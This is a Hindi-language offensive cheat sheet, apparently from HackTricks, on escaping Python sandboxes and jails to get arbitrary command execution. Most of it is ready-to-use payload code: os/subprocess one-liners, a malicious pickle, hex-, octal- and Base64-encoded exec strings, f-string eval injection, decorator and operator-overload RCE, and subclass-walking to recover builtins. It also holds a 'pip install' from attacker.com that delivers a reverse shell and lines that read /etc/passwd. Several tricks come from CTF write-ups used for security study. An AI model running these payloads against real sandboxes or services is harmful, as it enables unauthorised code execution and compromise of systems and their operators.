# Python sandboxes को bypass करना

{{#include ../../../banners/hacktricks-training.md}}

ये Python sandbox protections को bypass करने और arbitrary commands execute करने की कुछ tricks हैं।<sup>[[1]](#references)[[2]](#references)</sup>

{{#ref}}
js2py-sandbox-escape-cve-2024-28397.md
{{#endref}}


## Command Execution Libraries

सबसे पहले आपको यह जानना होगा कि क्या आप पहले से imported किसी library के साथ सीधे code execute कर सकते हैं, या इनमें से किसी library को import कर सकते हैं:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
याद रखें कि _**open**_ और _**read**_ functions Python sandbox के अंदर **files पढ़ने** और कुछ ऐसा **code लिखने** के लिए उपयोगी हो सकते हैं, जिसे आप sandbox को **bypass** करने के लिए **execute** कर सकें।

> [!CAUTION] > **Python2 input()** function program के crash होने से पहले python code को execute करने की अनुमति देता है।

Python पहले **current directory** से libraries **load** करने का प्रयास करता है (निम्न command यह प्रदर्शित करेगी कि Python modules को कहाँ से load कर रहा है): `python3 -c 'import sys; print(sys.path)'`

![Bypass Python sandboxes - Command Execution Libraries: Python पहले current directory से libraries load करने का प्रयास करता है (निम्न command यह प्रदर्शित करेगी कि Python modules को कहाँ से load कर रहा है...](<../../../images/image (559).png>)

## Bypass pickle sandbox with the default installed python packages

### Default packages

आप यहाँ **pre-installed** packages की **list** पा सकते हैं: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
ध्यान दें कि pickle से आप system में installed **arbitrary libraries** को Python env में **import** करवा सकते हैं।\
उदाहरण के लिए, निम्न pickle को load करने पर यह pip library को उपयोग करने के लिए import करेगा:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
pickle कैसे काम करता है, इसके बारे में अधिक जानकारी के लिए यह देखें: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)।<sup>[[16]](#references)</sup>

### Pip package

**@isHaacK** द्वारा साझा की गई Trick

यदि आपके पास `pip` या `pip.main()` का access है, तो आप एक arbitrary package install कर सकते हैं और इसे call करके reverse shell प्राप्त कर सकते हैं:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
आप reverse shell बनाने के लिए package यहाँ से download कर सकते हैं। कृपया ध्यान दें कि इसका उपयोग करने से पहले आपको **इसे decompress करना होगा, `setup.py` को बदलना होगा, और reverse shell के लिए अपना IP डालना होगा**:

{{#file}}
Reverse.tar (1).gz
{{#endfile}}

> [!TIP]
> इस package का नाम `Reverse` है। हालांकि, इसे इस तरह से specially crafted किया गया है कि जब आप reverse shell से बाहर निकलेंगे, तो installation का बाकी हिस्सा fail हो जाएगा, इसलिए बाहर निकलते समय **server पर कोई अतिरिक्त python package installed नहीं रहेगा**।

## Python code को Eval करना

> [!WARNING]
> ध्यान दें कि exec multiline strings और ";” को allow करता है, लेकिन eval ऐसा नहीं करता (walrus operator देखें)

यदि कुछ characters forbidden हैं, तो आप restriction को **bypass** करने के लिए **hex/octal/B64** representation का उपयोग कर सकते हैं:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### F-string re-evaluation sinks

एक अलग लेकिन बहुत सामान्य bug है **attacker-controlled data को एक string में insert करना और फिर उस string को f-string के रूप में evaluate करना**। यह **Jinja/SSTI** नहीं है; Python interpreter स्वयं दूसरे evaluation step के दौरान `{...}` के अंदर रखी गई किसी भी चीज़ को execute करता है:<sup>[[10]](#references)</sup>
```python
def template(first, last, gender):
text = f"Patient {first} {last} ({gender})"
return eval(f"f'''{text}'''")
```

```python
s = "2+3"
eval(f"f'''{s}'''")
# '2+3'

s = "{2+3}"
eval(f"f'''{s}'''")
# '5'
```
इसलिए, यदि braces, quotes, dots, underscores और parentheses allowed हों, तो निम्न जैसा payload आमतौर पर command execution देता है:
```python
{__import__("os").popen("id").read()}
```
यदि spaces या shell metacharacters को filter किया जाता है, तो command को Base64 में wrap करें और expression के अंदर उसे decode करें:
```python
{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
```
उपयोगी hunting patterns:

- `eval(f"f'''{user_input}'''")`
- `eval(f'f"{user_input}"')`
- ऐसा Code जो user data के साथ template बनाता है और फिर दोबारा बनाए गए string पर `eval`, `exec`, या `compile` call करता है
- XML/JSON handlers जो regexes से characters को validate करते हैं, लेकिन फिर भी `{}` और quotes की अनुमति देते हैं

यदि sink ऐसे Flask endpoint के पीछे है जो `request.data` से raw XML/bytes को parse करता है, तो याद रखें कि `curl -d` का default `application/x-www-form-urlencoded` होता है, जिससे `request.data` खाली हो सकता है। इसके बजाय **non-form** content type का उपयोग करें:
```bash
curl http://127.0.0.1:54321/addPatient \
-X POST \
-H 'Content-Type: application/xml' \
-d '<patient><firstname>a</firstname><lastname>b</lastname><sender_app>app</sender_app><timestamp>1</timestamp><birth_date>01/01/2000</birth_date><gender>{2+3}</gender></patient>'
```
### अन्य libraries जो Python code को eval करने की अनुमति देती हैं
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
PDF generators में एक वास्तविक-world sandboxed evaluator escape भी देखें:

- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733)। यह evaluated attributes (उदाहरण के लिए, font color) से function.__globals__ और os.system तक पहुंचने के लिए rl_safe_eval का दुरुपयोग करता है और rendering को stable बनाए रखने के लिए एक valid value लौटाता है।<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

{{#ref}}
reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

## Operators और short tricks
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Encodings (UTF-7) के माध्यम से protections को bypass करना

[**इस writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) में apparent sandbox के अंदर arbitrary Python code को load और execute करने के लिए UFT-7 का उपयोग किया गया है:<sup>[[11]](#references)</sup>
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
अन्य encodings का उपयोग करके भी इसे bypass करना संभव है, जैसे `raw_unicode_escape` और `unicode_escape`।

## calls के बिना Python execution

यदि आप ऐसे Python jail के अंदर हैं जो आपको **calls करने की अनुमति नहीं देता**, तब भी **arbitrary functions, code** और **commands को execute** करने के कुछ तरीके मौजूद हैं।

### [decorators](https://docs.python.org/3/glossary.html#term-decorator) के साथ RCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE: objects बनाना और overloading

यदि आप **class declare** कर सकते हैं और उस class का **object create** कर सकते हैं, तो आप अलग-अलग **methods को write/overwrite** कर सकते हैं, जिन्हें सीधे **call** किए बिना **trigger** किया जा सकता है।

#### custom classes के साथ RCE

आप कुछ **class methods** को संशोधित कर सकते हैं (_मौजूदा class methods को overwrite करके या नई class बनाकर_), ताकि वे **trigger** होने पर **arbitrary code execute** करें, **बिना** उन्हें सीधे **call** करने की आवश्यकता के।
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses) के साथ objects बनाना

metaclasses हमें जो मुख्य कार्य करने की अनुमति देते हैं, वह है **constructor** को सीधे call किए बिना किसी class का instance बनाना, इसके लिए target class को metaclass के रूप में रखते हुए एक नई class बनाई जाती है।<sup>[[15]](#references)</sup>
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### exceptions के साथ objects बनाना

जब एक **exception trigger** होता है, तो **Exception** का एक **object create** हो जाता है और आपको constructor को सीधे call करने की आवश्यकता नहीं होती (यह तरकीब [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez) से मिली है):
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### अधिक RCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### builtins help और license से फ़ाइल पढ़ें
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
## Builtins

- [**Python2 के Builtins functions**](https://docs.python.org/2/library/functions.html)
- [**Python3 के Builtins functions**](https://docs.python.org/3/library/functions.html)

यदि आप **`__builtins__`** object तक पहुँच सकते हैं, तो आप libraries import कर सकते हैं (ध्यान दें कि यहाँ आप अंतिम section में दिखाए गए अन्य string representation का भी उपयोग कर सकते हैं):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### कोई Builtins नहीं

जब आपके पास `__builtins__` नहीं होता, तो आप कुछ भी import नहीं कर पाएंगे और न ही files को पढ़ या लिख पाएंगे, क्योंकि **सभी global functions** (जैसे `open`, `import`, `print`...) **लोड नहीं किए गए होते हैं**।\
हालांकि, **default रूप से Python memory में बहुत से modules import करता है**। ये modules harmless लग सकते हैं, लेकिन इनमें से कुछ **अपने अंदर dangerous** functionalities भी import कर रहे होते हैं, जिनका उपयोग **arbitrary code execution** तक प्राप्त करने के लिए किया जा सकता है।<sup>[[4]](#references)[[5]](#references)</sup>

निम्नलिखित examples में आप देख सकते हैं कि **लोड किए गए** कुछ "**benign**" modules का **abuse** करके उनके अंदर मौजूद **dangerous** **functionalities** तक **access** कैसे प्राप्त किया जा सकता है।

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**नीचे एक बड़ा function है**](#recursive-search-of-builtins-globals), जिससे **builtins** मिलने के दर्जनों/**सैकड़ों** **स्थान** खोजे जा सकते हैं।

#### Python2 and Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### Builtins payloads
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globals और locals

**`globals`** और **`locals`** को check करना यह जानने का एक अच्छा तरीका है कि आप किस तक access कर सकते हैं।
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**नीचे एक बड़ा function है**](#recursive-search-of-builtins-globals) जो ऐसे दर्जनों/**सैकड़ों** **places** खोजने के लिए है जहाँ आपको **globals** मिल सकते हैं।

## Discover Arbitrary Execution

यहाँ मैं समझाना चाहता हूँ कि आसानी से **more dangerous functionalities loaded** कैसे खोजें और अधिक reliable exploits कैसे प्रस्तावित करें।

#### Accessing subclasses with bypasses

इस technique के सबसे sensitive हिस्सों में से एक है **base subclasses को access** कर पाना। पिछले examples में यह `''.__class__.__base__.__subclasses__()` का उपयोग करके किया गया था, लेकिन इसके **अन्य possible ways** भी हैं:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### लोड की गई खतरनाक libraries ढूँढना

उदाहरण के लिए, यह जानते हुए कि **`sys`** library से **मनमानी libraries को import करना** संभव है, आप उन सभी **लोड किए गए modules को खोज सकते हैं जिनके अंदर sys import किया गया है**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
बहुत सारे हैं, और **हमें commands execute करने के लिए सिर्फ़ एक चाहिए**:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
हम यही काम **अन्य libraries** के साथ कर सकते हैं, जिनके बारे में हमें पता है कि उनका उपयोग **commands execute** करने के लिए किया जा सकता है:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
